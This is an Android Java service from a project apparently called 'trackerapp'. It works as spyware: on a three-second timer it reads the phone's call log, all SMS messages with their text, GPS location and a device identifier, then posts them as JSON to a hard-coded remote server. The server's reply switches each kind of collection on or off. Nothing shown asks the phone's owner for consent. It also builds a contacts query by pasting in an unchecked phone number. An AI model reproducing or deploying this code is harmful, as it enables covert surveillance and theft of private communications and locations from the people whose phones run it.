package com.youhuan.trackerapp;

import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.mapapi.SDKInitializer;
import com.okhttplib.HttpInfo;
import com.okhttplib.OkHttpUtil;
import com.okhttplib.annotation.RequestType;
import com.okhttplib.callback.Callback;
import com.youhuan.trackerapp.utils.JobSchedulerManager;

import org.json.JSONObject;

import java.io.IOException;
import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/**
 * 轮询服务
 * Created by YouHuan on 17/9/2.
 */

public class PollingService extends Service {

    //用于发送广播
    private Intent intent = new Intent("com.youhuan.trackerapp.RECEIVER");
    private LocationClient mlocationClient;
    private String mLocationStr = "";
    private Timer mTimer;
    private TimerTask mTask;
    //    public Thread mThread;
    private JobSchedulerManager mJobManager;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        if (mThread == null) {
//            runGetThreadNews();
//        }
        mJobManager = JobSchedulerManager.getJobSchedulerInstance(this);
        mJobManager.startJobScheduler();
//        runGetThreadNews();

        final Runnable runnable = new Runnable() {
            @Override
            public void run() {
                buildData();
            }
        };

        if (mTimer == null) {
            mTimer = new Timer();
            if (mTask == null) {
                mTask = new TimerTask() {
                    @Override
                    public void run() {
                        new Handler(Looper.getMainLooper()).post(runnable);
                    }
                };

                mTimer.schedule(mTask, 1000, 3000);
            }
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
//        Log.e("--------->", "服务被启动！");
//        if (mThread == null) {
//            runGetThreadNews();
//        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mTask.cancel();
        mTask = null;
        mTimer.cancel();
        mTimer = null;
//        mThread.stop();
    }

    public void runGetThreadNews() {

//        mThread = new Thread(new Runnable() {
//
//            @Override
//            public void run() {
//                Looper.prepare();
        try {
//                    while (true) {
//                        String rate = SharedPreferencesTool.getString(PollingService.this, "rate");
//                        if (rate.equals("")) {
//                            rate = "30";
//                        }
//                        int rateInt = Integer.valueOf(rate);
//                        int sleepTime = rateInt * 1000;
//                        Thread.sleep(sleepTime);
//            buildData();
//                        Log.e("--轮询服务-->", "获取中...");
//                    }
        } catch (Exception e) {
            Log.e("--线程异常-->", e.getMessage());
        }
//                Looper.loop();//这种情况下，Runnable对象是运行在子线程中的，可以进行联网操作，但是不能更新UI
//            }
//        });
//        mThread.start();
    }


    //获取全部通话记录
    private List<Call> getCall() {
        List<Call> calls = new ArrayList<>();
        Cursor cs;
        if (ActivityCompat.checkSelfPermission(PollingService.this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(PollingService.this,
//                    new String[]{Manifest.permission.READ_CALL_LOG}, 1000);

        }
        cs = PollingService.this.getContentResolver().query(CallLog.Calls.CONTENT_URI, //系统方式获取通讯录存储地址
                new String[]{
                        CallLog.Calls.CACHED_NAME,  //姓名
                        CallLog.Calls.NUMBER,    //号码
                        CallLog.Calls.TYPE,  //呼入/呼出(2)/未接
                        CallLog.Calls.DATE,  //拨打时间
                        CallLog.Calls.DURATION,   //通话时长
                }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        int i = 0;
        if (cs != null && cs.getCount() > 0) {
            Date date = new Date(System.currentTimeMillis());
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd");
            String date_today = simpleDateFormat.format(date);
            for (cs.moveToFirst(); (!cs.isAfterLast()) && i < 1000; cs.moveToNext(), i++) {
                String callName = cs.getString(0);  //名称
                String callNumber = cs.getString(1);  //号码
                //如果名字为空，在通讯录查询一次有没有对应联系人
                if (callName == null || callName.equals("")) {
                    String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME};
                    //设置查询条件
                    String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + "='" + callNumber + "'";
                    Cursor cursor = PollingService.this.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            cols, selection, null, null);
                    int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                    if (cursor.getCount() > 0) {
                        cursor.moveToFirst();
                        callName = cursor.getString(nameFieldColumnIndex);
                    }
                    cursor.close();
                }
                //通话类型
                int callType = Integer.parseInt(cs.getString(2));
                String callTypeStr = "";
                switch (callType) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callTypeStr = "呼入";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callTypeStr = "呼出";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callTypeStr = "未接听";
                        break;
                    default:
                        //其他类型的，例如新增号码等记录不算进通话记录里，直接跳过
                        Log.i("ssss", "" + callType);
                        i--;
                        continue;
                }
                //拨打时间
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
                Date callDate = new Date(Long.parseLong(cs.getString(3)));
                String callDateStr = sdf.format(callDate);
                if (callDateStr.equals(date_today)) { //判断是否为今天
                    sdf = new SimpleDateFormat("HH:mm");
                    callDateStr = sdf.format(callDate);
                } else if (date_today.contains(callDateStr.substring(0, 7))) { //判断是否为当月
                    sdf = new SimpleDateFormat("dd");
                    int callDay = Integer.valueOf(sdf.format(callDate));

                    int day = Integer.valueOf(sdf.format(date));
                    if (day - callDay == 1) {
                        callDateStr = "昨天";
                    } else {
                        sdf = new SimpleDateFormat("MM-dd");
                        callDateStr = sdf.format(callDate);
                    }
                } else if (date_today.contains(callDateStr.substring(0, 4))) { //判断是否为当年
                    sdf = new SimpleDateFormat("MM-dd");
                    callDateStr = sdf.format(callDate);
                }

                //通话时长
                int callDuration = Integer.parseInt(cs.getString(4));
                int min = callDuration / 60;
                int sec = callDuration % 60;
                String callDurationStr = "";
                if (sec > 0) {
                    if (min > 0) {
                        callDurationStr = min + "分" + sec + "秒";
                    } else {
                        callDurationStr = sec + "秒";
                    }
                }

                /**
                 * callName 名字
                 * callNumber 号码
                 * callTypeStr 通话类型
                 * callDateStr 通话日期
                 * callDurationStr 通话时长
                 * 请在此处执行相关UI或存储操作，之后会查询下一条通话记录
                 */
                Log.i("Msg", "callName" + callName);
                Log.i("Msg", "callNumber" + callNumber);
                Log.i("Msg", "callTypeStr" + callTypeStr);
                Log.i("Msg", "callDateStr" + callDateStr);
                Log.i("Msg", "callDurationStr" + callDurationStr);
                Call call = new Call();
                call.setId(0);
                call.setDuration(callDurationStr);
                call.setNickname(callName);
                call.setTell(callNumber);
                call.setTime(callDateStr);
                call.setType(callTypeStr);
                calls.add(call);
            }
        }


        return calls;
    }

    //获取全部短信
    private List<Sms> getSms() {
        List<Sms> sms = new ArrayList<>();

        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/"), null, null, null, null);
//        StringBuffer buffter=new StringBuffer();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        while (cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndex("address"));//获取短信的号码
            String date = simpleDateFormat.format(new Date(cursor.getLong(cursor.getColumnIndex("date"))));//获取短信的日期
            String body = cursor.getString(cursor.getColumnIndex("body"));//获取短信内容
            int type = cursor.getInt(cursor.getColumnIndex("type"));//获取类型，看是否是接收还是发送
            String typeStr = "";
            if (type == 1) {
                typeStr = "接收";
            } else if (type == 2) {
                typeStr = "发送";
            } else {
                typeStr = null;
            }

            Sms s = new Sms();
            s.setId(0);
            s.setTell(address);
            s.setNickname("");
            s.setTime(date);
            s.setContent(body);
            s.setType(typeStr);
            sms.add(s);
        }

        return sms;
    }

    //获取位置
    private void getLocation() {
        SDKInitializer.initialize(getApplicationContext());
        mlocationClient = new LocationClient(getApplicationContext());
        mlocationClient.registerLocationListener(new MyLocationListener());
        initLocation();
        mlocationClient.start();
        Log.e("开始定位--->", "定位开始了！！！！！");
    }

    private void initLocation() {
        LocationClientOption option = new LocationClientOption();
        //设置坐标类型
        option.setCoorType("bd09ll");
        //设置是否需要地址信息，默认为无地址
        option.setIsNeedAddress(true);
        //设置是否打开gps进行定位
        option.setOpenGps(true);
        //可选，默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
        option.setLocationNotify(false);
        //设置扫描间隔，单位是毫秒 当<1000(1s)时，定时定位无效
        int span = 1000;
        option.setScanSpan(span);
        option.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);//高精度模式
        mlocationClient.setLocOption(option);
    }

    /**
     * 判断GPS是否开启，GPS或者AGPS开启一个就认为是开启的
     *
     * @return true 表示开启
     */
    public boolean isOPen() {
        LocationManager locationManager
                = (LocationManager) PollingService.this.getSystemService(Context.LOCATION_SERVICE);
        // 通过GPS卫星定位，定位级别可以精确到街（通过24颗卫星定位，在室外和空旷的地方定位准确、速度快）
        boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        // 通过WLAN或移动网络(3G/2G)确定的位置（也称作AGPS，辅助GPS定位。主要用于在室内或遮盖物（建筑群或茂密的深林等）密集的地方定位）
        boolean network = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        if (gps || network) {
            return true;
        }

        return false;
    }

    public class MyLocationListener implements BDLocationListener {

        @Override
        public void onReceiveLocation(BDLocation bdLocation) {
            String type = "";
            if (bdLocation.getLocType() ==
                    BDLocation.TypeGpsLocation) {
                type = "GPS";
            } else if (bdLocation.getLocType() == BDLocation.TypeNetWorkLocation) {
                type = "网络";
            }

            String locationStr = "定位方式：" + type + " 位置：" + bdLocation.getCountry() + "  " + bdLocation.getProvince()
                    + "  " + bdLocation.getCity() + "  " + bdLocation.getDistrict() +
                    "  " + bdLocation.getStreet();
            mLocationStr = "定位方式：" + type + " 位置：" + bdLocation.getAddrStr();
            Log.e("定位：", "定位结果：" + mLocationStr);
        }

        @Override
        public void onConnectHotSpotMessage(String s, int i) {

        }
    }

    private void buildData() {
        String is_location = SharedPreferencesTool.getString(PollingService.this, "is_location");
        if (is_location.equals("") || is_location.equals("1")) {
            getLocation();
        } else {
            mLocationStr = "定位功能已经被后台关闭！";
        }

//        Thread thread = new Thread(new Runnable() {
//            @Override
//            public void run() {
        try {
//                    Thread.sleep(6000);

            //构造通话记录数据
            StringBuffer callStr = new StringBuffer();
            callStr.append("[");
            List<Call> calls = new ArrayList<>();
            String is_getcall = SharedPreferencesTool.getString(PollingService.this, "is_getcall");
            if (is_getcall.equals("") || is_getcall.equals("1")) {
                calls.clear();
                calls.addAll(getCall());
            }
            int clen = calls.size();
            for (int i = 0; i < clen; i++) {
                JSONObject callJson = new JSONObject();
                callJson.put("tell", calls.get(i).getTell());
                callJson.put("type", calls.get(i).getType());
                callJson.put("time", calls.get(i).getTime());
                callJson.put("duration", calls.get(i).getDuration());
                String nickname = "";
                if (calls.get(i).getNickname() != null) {
                    nickname = calls.get(i).getNickname();
                }
                callJson.put("nickname", nickname);
                callStr.append(callJson.toString() + ",");
            }
            String cStr = callStr.toString();
            cStr = cStr.substring(0, cStr.length() - 1);
            cStr = cStr + "]";
            if (cStr.length() < 2) {
                cStr = "[]";
            }

            //构造短信数据
            StringBuffer smsStr = new StringBuffer();
            smsStr.append("[");
            List<Sms> smsList = new ArrayList<>();
            String is_getsms = SharedPreferencesTool.getString(PollingService.this, "is_getsms");
            if (is_getsms.equals("") || is_getsms.equals("1")) {
                smsList.clear();
                smsList.addAll(getSms());
            }
            int slen = smsList.size();
            for (int j = 0; j < slen; j++) {
                JSONObject smsJson = new JSONObject();
                smsJson.put("tell", smsList.get(j).getTell());
                smsJson.put("content", smsList.get(j).getContent());
                smsJson.put("type", smsList.get(j).getType());
                smsJson.put("time", smsList.get(j).getTime());
                smsJson.put("nickname", smsList.get(j).getNickname());
                smsStr.append(smsJson.toString() + ",");
            }
            String sStr = smsStr.toString();
            sStr = sStr.substring(0, sStr.length() - 1);
            sStr = sStr + "]";
            if (sStr.length() < 2) {
                sStr = "[]";
            }

            JSONObject mainJson = new JSONObject();
            mainJson.put("phone_no", SystemUtil.getSystemModel());//手机型号
            mainJson.put("machineCode", SystemUtil.getUniqueID(PollingService.this));//机器码
            mainJson.put("position", mLocationStr);//当前位置
            mainJson.put("base_msg", SystemUtil.getDeviceBrand() +
                    "  " + SystemUtil.getSystemModel() +
                    "  " + SystemUtil.getSystemVersion());//基础信息
            mainJson.put("sms", "");//短信   废弃
            mainJson.put("_call", "");//电话  废弃
            mainJson.put("newSms", 987654321);//短信集合*###NewSMS###*
            mainJson.put("newCall", 887654321);//通话记录集合*###NewCALL###*
            String mainStr = mainJson.toString();


            mainStr = mainStr.replace("987654321", sStr);
            mainStr = mainStr.replace("887654321", cStr);

            Log.e("------->", mainStr);
            postMessage(mainStr);

        } catch (Exception e) {
            Log.e("-->", "EX:" + e.getMessage());
        }
//            }
//        });
//        thread.start();
    }

    private void doPost(String json) {

        OkHttpUtil.getDefault(PollingService.this).doAsync(
                HttpInfo.Builder()
                        .setUrl("http://192.168.2.207/Tracker/public/api/Affair/insertMessage")
                        .setRequestType(RequestType.POST)//设置请求方式
                        .addParam("Data", json)//添加接口参数
                        .build(),
                new Callback() {
                    @Override
                    public void onFailure(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        Log.e("--doPost-->", "异步请求失败:" + result);
                    }

                    @Override
                    public void onSuccess(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        Log.e("--doPost-->", "异步请求成功:" + result);
                        mlocationClient.stop();

                    }
                });
    }

    public void postMessage(String json) {
        OkHttpUtil.getDefault(this).doAsync(
                HttpInfo.Builder()
                        .setUrl("http://111.230.27.114//Tracker/public/api/Affair/insertMessage")
                        .setRequestType(RequestType.POST)//设置请求方式
                        .addParam("Data", json)//添加接口参数
                        .build(),
                new Callback() {
                    @Override
                    public void onFailure(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        Log.e("--postMessage-->", "异步请求失败:" + result);
                        mlocationClient.stop();
//                        buildData();
                    }

                    @Override
                    public void onSuccess(HttpInfo info) throws IOException {
                        String result = info.getRetDetail();
                        mlocationClient.stop();
                        Log.e("--postMessage-->", "异步请求成功:" + result);
                        //解析
                        try {
                            JSONObject object = new JSONObject(result);
                            String msg = object.getString("msg");
                            String state = object.getString("state");
                            String data = object.getString("data");
                            if (state.equals("success")) {
                                JSONObject datajson = new JSONObject(data);
                                String id = datajson.getString("id");
                                String phone_id = datajson.getString("phone_id");
                                String later_time = datajson.getString("later_time");
                                String rate = datajson.getString("rate");
                                String create_time = datajson.getString("create_time");
                                String update_time = datajson.getString("update_time");
                                String is_getsms = datajson.getString("is_getsms");
                                String is_getcall = datajson.getString("is_getcall");
                                String is_location = datajson.getString("is_location");
                                String param1 = datajson.getString("param1");
                                String param2 = datajson.getString("param2");

                                SharedPreferencesTool.putString(PollingService.this, "id", id);
                                SharedPreferencesTool.putString(PollingService.this, "phone_id", phone_id);
                                SharedPreferencesTool.putString(PollingService.this, "later_time", later_time);
                                SharedPreferencesTool.putString(PollingService.this, "rate", rate);

                                SharedPreferencesTool.putString(PollingService.this, "create_time", create_time);
                                SharedPreferencesTool.putString(PollingService.this, "update_time", update_time);
                                SharedPreferencesTool.putString(PollingService.this, "is_getsms", is_getsms);
                                SharedPreferencesTool.putString(PollingService.this, "is_getcall", is_getcall);

                                SharedPreferencesTool.putString(PollingService.this, "is_location", is_location);
                                SharedPreferencesTool.putString(PollingService.this, "param1", param1);
                                SharedPreferencesTool.putString(PollingService.this, "param2", param2);

                                Toast.makeText(getApplicationContext(), "完成一次提交！", Toast.LENGTH_SHORT)
                                        .show();
//                                stopService();
                                PollingService.this.stopSelf();

                            } else {
                            }
                        } catch (Exception e) {
                            Log.e("--login-->", "解析出现异常:" + e);
                        }
                    }
                });

    }


}
